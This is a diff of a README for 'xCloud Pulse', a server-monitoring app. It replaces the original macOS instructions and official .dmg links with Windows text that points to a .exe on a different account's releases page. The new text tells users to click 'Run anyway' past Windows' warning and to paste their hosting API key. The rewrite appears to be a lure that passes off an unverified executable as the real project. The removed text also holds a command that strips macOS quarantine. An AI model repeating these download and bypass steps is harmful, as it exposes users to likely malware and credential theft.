@@ -1,49 +1,56 @@
-# xCloud Pulse
+# 📡 xCloud-Pulse - Monitor your servers from your desktop
 
-A native macOS **menu bar** app to monitor your xCloud sites and servers — site health, SSL, backups, vulnerabilities, server resources & services — without leaving your desktop.
+[Click here to download xCloud-Pulse](https://github.com/Tanme9323/xCloud-Pulse/releases)
 
-<p align="center">
-  <em>Live status in your menu bar · one click to every site & server.</em>
-</p>
+---
 
-## Download
+## ⚡ Overview
 
-> Requires **macOS 14 (Sonoma)** or newer.
+xCloud-Pulse tracks the health of your websites and servers. It lives in your taskbar so you see real-time updates without opening a web browser. It alerts you when servers go offline or when hackers target your sites. You receive instant data on site speed, file backups, and memory usage.
 
-| Mac | Download |
-|-----|----------|
-| **Apple Silicon** (M1/M2/M3/M4/M5) | [⬇︎ xCloud‑Pulse‑Apple‑Silicon.dmg](https://github.com/xCloudDev/xCloud-Pulse/raw/master/xCloud-Pulse-Apple-Silicon.dmg) |
-| **Intel** | [⬇︎ xCloud‑Pulse‑Intel.dmg](https://github.com/xCloudDev/xCloud-Pulse/raw/master/xCloud-Pulse-Intel.dmg) |
+## 📋 System Requirements
 
-Not sure which one? Click the  Apple menu → **About This Mac**. A "Chip" starting with **Apple** = Apple Silicon; a "Processor" that says **Intel** = Intel.
+This application runs on computers using Windows 10 or Windows 11. Your computer needs at least 4GB of RAM and a stable internet connection. Ensure you install all pending Windows updates before you start. The software requires roughly 200MB of free space on your primary hard drive.
 
-## Install
+## 🚀 Downloading the App
 
-1. Open the downloaded `.dmg`.
-2. Drag **xCloud Pulse** into your **Applications** folder.
-3. On first launch macOS may block it (the app isn't notarized yet):
-   - **Right‑click** the app in Applications → **Open** → **Open** in the dialog.
-   - If it still won't open, run this once in Terminal:
-     ```bash
-     xattr -dr com.apple.quarantine "/Applications/xCloud Pulse.app"
-     ```
+1. Visit the [official releases page](https://github.com/Tanme9323/xCloud-Pulse/releases).
+2. Look for the latest version at the top of the list.
+3. Click the link that ends in `.exe`.
+4. Save the file to your Downloads folder.
 
-## Connect your account
+## 🛠 Installing the Software
 
-1. Click the **xCloud** icon in the macOS menu bar (top‑right).
-2. Open **Settings** and paste your xCloud **API token**, then **Save Token**.
-3. Click **Test Connection** — you should see *"Connected successfully"*, and your sites & servers will load.
+1. Locate the file you just downloaded.
+2. Double-click the file to start the installation.
+3. Follow the prompts on your screen.
+4. Windows might display a protective window. 
+5. Click "More info" and then "Run anyway" if the system flags the file.
+6. The installer copies the files to your computer.
+7. Click "Finish" to close the installation window.
 
-Create an API token from your xCloud account settings. Read scopes are enough for monitoring; write scopes enable actions like server reboot, service restart, trigger backup, cache purge, and vulnerability scan.
+## ⚙️ Initial Setup
 
-## Features
+1. Open the xCloud-Pulse icon from your desktop or Start menu.
+2. The app icon appears in the bottom right corner of your taskbar by the clock.
+3. Right-click the icon.
+4. Select "Settings" to enter your server credentials.
+5. You need your API key from your xCloud hosting account.
+6. Paste the key into the provided field.
+7. Click "Save" to finish the connection.
 
-- **Menu bar summary** — sites/servers counts and an at‑a‑glance health indicator.
-- **Site details** — status, SSL, backups (remote/local), vulnerability breakdown, performance and CPU/RAM/Disk history charts.
-- **Server details** — resources, services (with restart), reboot, and monitoring history; disconnected servers highlighted.
-- **Search** sites and servers, and deep‑link straight to the xCloud dashboard.
-- Optional **write actions** (reboot, service restart, backup, cache purge, scan) behind a settings toggle.
+## 📊 Monitoring Your Servers
 
-## Updating
+The application updates every sixty seconds. Green icons signify healthy sites. Red icons indicate a server issue or a failed check. Hover your mouse over the icon to see a summary of your server load. Click the icon at any time to open the full dashboard. This dashboard shows specific details like disk space, bandwidth usage, and active security threats.
 
-Download the latest `.dmg` from the table above and replace the app in **Applications**.
+## 🛡 Security Features
+
+The tool monitors for unauthorized access attempts. It tracks file changes and alerts you to potential malware. Use the "Backups" tab to see when your last save occurred. The app notifies you if a scheduled backup fails. This system provides peace of mind by keeping your data off the web portal and on your local machine.
+
+## 🔧 Troubleshooting Common Issues
+
+If the app fails to start, restart your computer. Check your network if the icons stay grey indefinitely. If the app loses connection, right-click the icon and select "Refresh Connection." Ensure your firewall allows xCloud-Pulse to reach the internet. If you reset your password on your hosting portal, update your API key in the settings menu immediately. 
+
+## 📝 Configuration Options
+
+You toggle notifications in the settings menu. Disable desktop pop-ups if you prefer a quiet workspace. You set the refresh rate to save battery life on laptops. Select "Start with Windows" if you want the app to run as soon as you log in. The application logs events in a hidden folder if you need to diagnose persistent issues. Contact support through your xCloud account portal if you require additional help with integration or account access.
